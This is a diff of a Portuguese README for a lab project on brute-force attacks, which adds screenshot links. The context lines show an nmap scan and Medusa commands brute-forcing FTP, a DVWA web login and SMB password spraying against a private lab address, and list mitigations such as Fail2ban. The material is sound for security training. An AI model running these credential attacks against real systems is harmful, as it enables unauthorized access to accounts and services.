@@ -14,10 +14,12 @@ Este projeto demonstra ataques de força bruta utilizando Kali Linux, Metasploit
 nmap -sV -p 21,22,80,139,445 192.168.56.101
 ```
 ![Nmap Scan](images/nmap_scan.png)
+
 ## Ataque FTP
 ```bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -v 6
 ```
+![Medusa FTP](images/medusa_ftp.png)
 
 ## Ataque HTTP (DVWA)
 ```bash
@@ -30,11 +32,13 @@ medusa -h 192.168.56.101 \
 -m DENY-SIGNAL:"Login failed" \
 -v 6
 ```
+![Medusa DVWA](images/medusa_dvwa.png)
 
 ## Password Spraying SMB
 ```bash
 medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt
 ```
+![Medusa SMB](images/medusa_smb.png)
 
 ## Mitigações
 - Fail2ban
@@ -47,7 +51,7 @@ medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt
 - pass.txt  
 - smb_users.txt  
 - smb_pass.txt  
-- pasta /images (adicione prints depois)
+- pasta /images 
 
 ## 👤 Autor
 Ilker Sobrinho
